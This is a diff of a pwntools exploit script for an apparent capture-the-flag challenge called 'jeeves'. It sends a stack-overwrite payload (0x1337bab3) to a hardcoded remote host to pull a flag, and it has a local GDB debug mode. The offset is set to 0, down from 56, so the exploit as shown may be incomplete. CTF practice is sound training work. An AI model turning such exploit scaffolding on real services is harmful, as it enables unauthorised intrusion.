@@ -1,23 +1,35 @@
 from pwn import *
-import struct
+import time
 
 context.terminal = ['tmux', 'new-window']
+target = './jeeves'
+context.binary = target
+binary = ELF(target)
 
 rhost = "83.136.252.214" 
-rport = "43228"
+rport = 36577 
 
-if args['NC']:
- 	l = listen(9999)
-	r = remote(rhost, rport) 
-	svr = l.wait_for_connection()
-	print(svr.recv())
-else:
-   print("Required NC as args")
+offset = 0
 
-offset = 56
-buffer = b""
-buffer += b"A"*offset
+payload = flat(
+        {offset: 0x1337bab3}
+)
 
-r.send('hello')
 
+if args['PWN']:
+    r = remote(rhost, rport) 
+    r.sendlineafter('May I have your name?', payload)
+    r.recvuntil('}')
+    flag = r.recv()
+    success(flag)
+    r.close()
+if args['GEF']:
+    p = process(target,setuid=True)
+    gdb.attach(p, gdbscript='continue')
+    p.sendlineafter('May I have your name?', payload)
+    time.sleep(10)
+    p.recvuntil('}')
+    flag = p.recv()
+    success(flag)
+    p.close()
 
